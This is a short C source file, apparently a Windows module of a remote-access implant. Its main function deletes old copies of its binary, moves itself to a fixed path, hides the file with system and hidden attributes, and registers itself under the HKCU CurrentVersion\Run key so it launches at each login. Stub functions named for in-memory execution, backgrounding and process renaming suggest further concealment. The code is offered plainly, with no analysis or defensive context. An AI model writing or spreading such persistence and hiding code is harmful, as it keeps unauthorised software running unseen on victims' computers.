#include "system.h"

int persistent_launch_agent(char *none) {
    char path[MAX_PATH];

    strcpy(path, win_bin_path);
    DeleteFile(path);
    char *ext_tmp = ".tmp";
    strcpy(path, win_bin_path);
    strcat(path, ext_tmp);
    DeleteFile(path);
    char *ext_bak = ".bak";

    strcpy(path, win_bin_path);
    strcat(path, ext_bak);
    DeleteFile(path);

    char *ext_exe = ".exe";

    strcpy(path, win_bin_path);
    strcat(path, ext_exe);
    DeleteFile(path);

    if (!move_file(g_current_path, win_bin_path)) {
        return 0;
    }

    SetFileAttributes(win_bin_path, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

    char *reg_run = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    return create_reg_item(HKEY_CURRENT_USER, reg_run, win_bin_name,
                           win_bin_path);
}

int run_memory(char *buf) {

    return 0;
}

void into_background() {
    return;
}

int set_process_name(char *name) {
    return 0;
}
